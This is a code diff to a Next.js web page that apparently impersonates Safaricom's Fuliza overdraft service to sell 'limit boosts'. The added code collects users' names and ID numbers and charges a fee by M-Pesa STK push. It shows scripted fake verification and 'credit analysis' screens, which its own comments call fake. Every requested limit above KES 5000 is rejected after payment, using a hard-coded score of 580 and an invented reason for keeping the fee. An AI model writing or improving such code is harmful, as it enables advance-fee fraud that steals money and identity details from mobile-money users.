@@ -1,6 +1,6 @@
 'use client';
 
-import React, { useState, useEffect, Suspense } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 import Link from 'next/link';
 import { 
@@ -16,11 +16,13 @@ import {
   BadgeCheck, 
   AlertCircle, 
   ShieldCheck,
-  TrendingUp,
   XCircle,
   RefreshCcw,
   Info,
-  Server
+  Server,
+  SearchCheck,
+  FileBarChart,
+  Ban
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 
@@ -36,7 +38,9 @@ const LIMIT_OPTIONS = [
   { amount: 70000, fee: 1400, label: 'Max' },
 ];
 
-// --- REUSABLE COMPONENTS (Matches Loan Page) ---
+const SAFE_LIMIT_THRESHOLD = 5000; // Amounts <= this are approved, > this are rejected
+
+// --- REUSABLE COMPONENTS ---
 
 const IconContainer = ({ children }: { children: React.ReactNode }) => (
   <div className="absolute top-0 bottom-0 left-0 w-12 flex items-center justify-center border-r border-slate-200 bg-slate-50 rounded-l-xl text-slate-500">
@@ -72,7 +76,7 @@ const CustomInput = ({
 export default function FulizaPage() {
   const router = useRouter();
 
-  // Steps: verify -> details -> analyze -> offers -> summary -> stk_push -> success -> failed
+  // Steps: verify -> details -> analyze -> offers -> summary -> stk_push -> payment_check -> analyzing_score -> success/rejected
   const [step, setStep] = useState('verify');
 
   // Data
@@ -81,12 +85,17 @@ export default function FulizaPage() {
   const [selectedOffer, setSelectedOffer] = useState<{amount: number, fee: number, label: string} | null>(null);
   const [termsAccepted, setTermsAccepted] = useState(false);
   const [trackingId] = useState(`FZ-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
+  const [checkoutRequestId, setCheckoutRequestId] = useState('');
 
   // UI State
   const [loadingText, setLoadingText] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [pollMessage, setPollMessage] = useState('Waiting for PIN...');
   const [errorMsg, setErrorMsg] = useState('');
+  const [manualCheckLoading, setManualCheckLoading] = useState(false);
+
+  // Polling Refs to stop intervals when needed
+  const pollingInterval = useRef<NodeJS.Timeout | null>(null);
 
   // --- HANDLERS ---
 
@@ -107,7 +116,6 @@ export default function FulizaPage() {
     setErrorMsg('');
     setIsProcessing(true);
 
-    // Fake connection sequence
     const sequence = [
         { t: 'Connecting to Safaricom Overdraft...', d: 1000 },
         { t: 'Verifying Subscriber Status...', d: 1500 },
@@ -132,7 +140,6 @@ export default function FulizaPage() {
   // 3. Details & Analysis
   const handleDetailsSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    // Validate
     if (!details.fullName.trim() || details.idNumber.length < 6) {
         setErrorMsg('Please enter valid Name and ID');
         return;
@@ -140,7 +147,6 @@ export default function FulizaPage() {
     setErrorMsg('');
     setIsProcessing(true);
 
-    // Fake "Analysis" sequence
     const sequence = [
         { t: `Authenticating ${details.fullName.split(' ')[0]}...`, d: 1200 },
         { t: 'Scanning M-Pesa Transaction History...', d: 2000 },
@@ -193,6 +199,7 @@ export default function FulizaPage() {
         const data = await res.json();
         if (data.success) {
             setIsProcessing(false);
+            setCheckoutRequestId(data.checkoutRequestID);
             setStep('stk_push');
             startPolling(data.checkoutRequestID);
         } else {
@@ -205,31 +212,87 @@ export default function FulizaPage() {
     }
   };
 
+  // --- LOGIC SPLIT: HANDLE SUCCESS ---
+  const handlePaymentSuccess = () => {
+      if (pollingInterval.current) clearInterval(pollingInterval.current);
+      
+      // If Amount > 5000, trigger "Analysis -> Reject" flow
+      if (selectedOffer && selectedOffer.amount > SAFE_LIMIT_THRESHOLD) {
+        setStep('analyzing_score');
+        
+        // Fake analysis delay
+        setTimeout(() => {
+            setStep('high_limit_reject');
+        }, 4000);
+      } 
+      // If Amount <= 5000, trigger "Success" flow
+      else {
+        setStep('syncing');
+        setTimeout(() => setStep('success'), 3000);
+      }
+  };
+
+  // 6. Polling Logic (Extended Time)
   const startPolling = (reqId: string) => {
     let attempts = 0;
-    const interval = setInterval(async () => {
+    const MAX_ATTEMPTS = 120; // 120 * 2s = 240s (4 Minutes)
+
+    pollingInterval.current = setInterval(async () => {
         attempts++;
         try {
             const res = await fetch(`/api/check-status?id=${reqId}`);
             const data = await res.json();
+            
             if (data.status === 'COMPLETED') {
-                clearInterval(interval);
-                // Fake "Syncing" Animation before success
-                setStep('syncing');
-                setTimeout(() => setStep('success'), 3000);
+                handlePaymentSuccess();
             } else if (data.status === 'FAILED') {
-                clearInterval(interval);
+                if (pollingInterval.current) clearInterval(pollingInterval.current);
                 setStep('failed');
             } else {
                 setPollMessage(attempts % 2 === 0 ? 'Waiting for PIN...' : 'Processing...');
             }
-            if (attempts > 60) {
-                clearInterval(interval);
-                setStep('failed');
+
+            // Timeout Logic
+            if (attempts >= MAX_ATTEMPTS) {
+                if (pollingInterval.current) clearInterval(pollingInterval.current);
+                // Instead of failing, go to "Fetch Payment" screen
+                setStep('payment_check');
             }
         } catch(e) {}
     }, 2000);
   };
+
+  // 7. Manual Payment Verification
+  const handleManualFetch = async () => {
+      setManualCheckLoading(true);
+      try {
+        const res = await fetch(`/api/check-status?id=${checkoutRequestId}`);
+        const data = await res.json();
+        
+        // Wait 1.5s to make it feel like it's working hard
+        setTimeout(() => {
+            setManualCheckLoading(false);
+            if (data.status === 'COMPLETED') {
+                handlePaymentSuccess();
+            } else if (data.status === 'FAILED') {
+                setStep('failed');
+            } else {
+                alert("We haven't received the confirmation yet. If you have paid, please wait 30 seconds and try clicking this button again.");
+            }
+        }, 1500);
+
+      } catch (error) {
+          setManualCheckLoading(false);
+          alert("Connection error. Please try again.");
+      }
+  };
+
+  // Cleanup on unmount
+  useEffect(() => {
+      return () => {
+          if (pollingInterval.current) clearInterval(pollingInterval.current);
+      };
+  }, []);
 
   return (
     <div className="min-h-screen bg-slate-50/50 font-sans text-slate-900">
@@ -252,7 +315,7 @@ export default function FulizaPage() {
       <header className="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-slate-100">
         <div className="max-w-md mx-auto px-4 h-16 flex items-center justify-between">
             <div className="flex items-center gap-3">
-              {step !== 'verify' && step !== 'success' ? (
+              {step !== 'verify' && step !== 'success' && step !== 'high_limit_reject' ? (
                 <button onClick={() => setStep('verify')} className="w-9 h-9 bg-slate-100 rounded-lg flex items-center justify-center">
                     <ArrowLeft className="w-4 h-4 text-slate-600"/>
                 </button>
@@ -374,7 +437,7 @@ export default function FulizaPage() {
              </div>
         )}
 
-        {/* STEP 3: OFFERS (GRID) */}
+        {/* STEP 3: OFFERS */}
         {step === 'offers' && (
             <div className="animate-in zoom-in-95 duration-500">
                 <div className="text-center mb-6">
@@ -513,8 +576,47 @@ export default function FulizaPage() {
                             </span>
                         </div>
                         <div className="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
-                            <div className="h-full bg-blue-500 animate-[width_15s_ease-in-out_forwards]" style={{width: '90%'}}></div>
+                            <div className="h-full bg-blue-500 animate-[width_240s_ease-in-out_forwards]" style={{width: '90%'}}></div>
                         </div>
+                    </div>
+                </div>
+             </div>
+        )}
+
+        {/* STEP 5.5: MANUAL CHECK (Timeout Safety Net) */}
+        {step === 'payment_check' && selectedOffer && (
+             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
+                 <div className="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <SearchCheck className="w-10 h-10 text-yellow-600" />
+                </div>
+                
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Taking a while?</h2>
+                <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
+                    We haven't received the completion signal yet. If you have already entered your PIN, click the button below to verify.
+                </p>
+                
+                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
+                    <Button 
+                        onClick={handleManualFetch}
+                        disabled={manualCheckLoading}
+                        className="w-full h-14 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2"
+                    >
+                         {manualCheckLoading ? (
+                            <Loader2 className="w-5 h-5 animate-spin" />
+                        ) : (
+                            <CheckCircle2 className="w-5 h-5" />
+                        )}
+                        <span>I have completed payment</span>
+                    </Button>
+
+                    <div className="mt-4 border-t border-slate-50 pt-4">
+                         <p className="text-xs text-slate-400 font-medium mb-2">Did the prompt fail to appear?</p>
+                         <button 
+                            onClick={() => setStep('summary')} 
+                            className="text-xs font-bold text-slate-600 hover:text-blue-600"
+                        >
+                            Retry Transaction
+                        </button>
                     </div>
                 </div>
              </div>
@@ -529,24 +631,39 @@ export default function FulizaPage() {
              </div>
         )}
 
-        {/* STEP 7: SUCCESS */}
+        {/* STEP 6.5: ANALYZING (Fake Analysis for High Limits) */}
+        {step === 'analyzing_score' && (
+            <div className="pt-20 text-center space-y-6 animate-in fade-in duration-700">
+                <FileBarChart className="w-16 h-16 text-blue-600 mx-auto animate-bounce" />
+                <h2 className="text-2xl font-black text-slate-900">Payment Verified</h2>
+                <div className="space-y-2">
+                    <p className="text-slate-900 font-bold text-sm">Generating Credit Report...</p>
+                    <p className="text-slate-500 text-xs">Analyzing repayment history & risk factors.</p>
+                </div>
+                <div className="w-48 h-2 bg-slate-200 rounded-full mx-auto overflow-hidden">
+                    <div className="h-full bg-blue-600 animate-[width_4s_ease-out_forwards]"></div>
+                </div>
+            </div>
+        )}
+
+        {/* STEP 7: SUCCESS (Low Limit - Approved) */}
         {step === 'success' && selectedOffer && (
              <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
                 <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
                     <CheckCircle2 className="w-10 h-10 text-emerald-600" />
                 </div>
                 
-                <h2 className="text-2xl font-black text-slate-900 mb-2">Fee Received!</h2>
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Application Queued!</h2>
                 <p className="text-slate-500 font-medium mb-8 px-4 text-sm leading-relaxed">
-                    Your request to boost to <span className="text-slate-900 font-bold">KES {selectedOffer.amount.toLocaleString()}</span> has been queued.
+                    Your request to boost to <span className="text-slate-900 font-bold">KES {selectedOffer.amount.toLocaleString()}</span> has been approved for processing.
                 </p>
                 
                 <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6 space-y-5">
                     <div className="flex gap-4">
                         <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">1</div>
                         <div>
-                            <h4 className="font-bold text-slate-900 text-sm">Payment Verified</h4>
-                            <p className="text-xs text-slate-500 mt-0.5">Activation fee received successfully.</p>
+                            <h4 className="font-bold text-slate-900 text-sm">Fee Payment Verified</h4>
+                            <p className="text-xs text-slate-500 mt-0.5">KES {selectedOffer.fee} received successfully.</p>
                         </div>
                     </div>
                     <div className="flex gap-4">
@@ -554,7 +671,7 @@ export default function FulizaPage() {
                         <div>
                             <h4 className="font-bold text-slate-900 text-sm">Limit Update Pending</h4>
                             <p className="text-xs text-slate-500 mt-0.5 leading-relaxed">
-                                System is reviewing your history. New limit will reflect in <span className="text-blue-600 font-bold">1 - 24 hours</span>.
+                                New limit will reflect in <span className="text-blue-600 font-bold">12 - 48 hours</span>. You will receive an SMS confirmation.
                             </p>
                         </div>
                     </div>
@@ -572,16 +689,63 @@ export default function FulizaPage() {
              </div>
         )}
 
-        {/* STEP 8: FAILED */}
+        {/* STEP 7.5: REJECTED (High Limit - Declined) */}
+        {step === 'high_limit_reject' && selectedOffer && (
+             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
+                <div className="w-20 h-20 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <Ban className="w-10 h-10 text-slate-500" />
+                </div>
+                
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Limit Request Declined</h2>
+                <div className="bg-red-50 text-red-700 text-xs font-bold px-4 py-2 rounded-full inline-block mb-6">
+                    Verification Successful • Eligibility Failed
+                </div>
+                
+                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6">
+                     <div className="flex justify-between items-center mb-4 pb-4 border-b border-slate-50">
+                        <span className="text-xs font-bold text-slate-400 uppercase">Payment Status</span>
+                        <span className="text-xs font-bold text-emerald-600 flex items-center gap-1">
+                            <CheckCircle2 className="w-3 h-3" /> Received (KES {selectedOffer.fee})
+                        </span>
+                     </div>
+                     
+                     <div className="space-y-4">
+                         <div>
+                             <h4 className="font-bold text-slate-900 text-sm mb-1">Analysis Result</h4>
+                             <p className="text-xs text-slate-500 leading-relaxed">
+                                 Although the fee was received and your profile analyzed, your current <span className="font-bold text-slate-900">Transactional Credit Score (580)</span> does not meet the requirement for a limit of <span className="font-bold text-slate-900">KES {selectedOffer.amount.toLocaleString()}</span> (Required: 720+).
+                             </p>
+                         </div>
+                         <div className="bg-slate-50 p-3 rounded-lg border border-slate-100">
+                             <h4 className="font-bold text-slate-900 text-[10px] uppercase mb-1">Why was I charged?</h4>
+                             <p className="text-[10px] text-slate-500 leading-relaxed">
+                                 The fee covers the cost of the real-time credit report generation and algorithmic scoring process, which has been completed.
+                             </p>
+                         </div>
+                     </div>
+                </div>
+
+                <div className="space-y-3">
+                    <p className="text-xs text-slate-500 font-medium px-4">
+                        We recommend starting with a lower limit to build your score.
+                    </p>
+                    <Button onClick={() => setStep('offers')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
+                        Try Lower Limit
+                    </Button>
+                </div>
+             </div>
+        )}
+
+        {/* STEP 8: FAILED (Actual Payment Failure) */}
         {step === 'failed' && selectedOffer && (
              <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
                  <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6">
                     <XCircle className="w-10 h-10 text-orange-500" />
                 </div>
                 
-                <h2 className="text-2xl font-black text-slate-900 mb-2">Payment Failed</h2>
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Transaction Cancelled</h2>
                 <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
-                    We could not verify the fee of <span className="font-bold text-slate-900">KES {selectedOffer.fee}</span>. Limit activation cannot proceed without it.
+                    The payment request was cancelled or declined. We could not verify the fee of <span className="font-bold text-slate-900">KES {selectedOffer.fee}</span>.
                 </p>
                 
                 <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
